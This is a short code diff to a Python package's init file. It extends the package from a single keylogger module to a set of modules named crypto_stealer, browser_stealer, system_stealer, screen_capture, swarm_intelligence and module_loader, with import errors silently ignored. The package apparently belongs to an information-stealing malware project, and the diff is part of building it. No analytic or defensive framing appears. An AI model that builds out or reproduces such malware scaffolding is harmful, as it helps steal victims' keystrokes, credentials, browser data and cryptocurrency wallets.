@@ -10,7 +10,21 @@ __author__ = "Mr. Thomas Anderson"
 # Import modules for easier access
 try:
     from . import keylogger
-except ImportError:
+    from . import crypto_stealer
+    from . import browser_stealer
+    from . import system_stealer
+    from . import screen_capture
+    from . import swarm_intelligence
+    from . import module_loader
+except ImportError as e:
     pass
 
-__all__ = ['keylogger'] 
+__all__ = [
+    'keylogger', 
+    'crypto_stealer', 
+    'browser_stealer', 
+    'system_stealer', 
+    'screen_capture', 
+    'swarm_intelligence',
+    'module_loader'
+] 
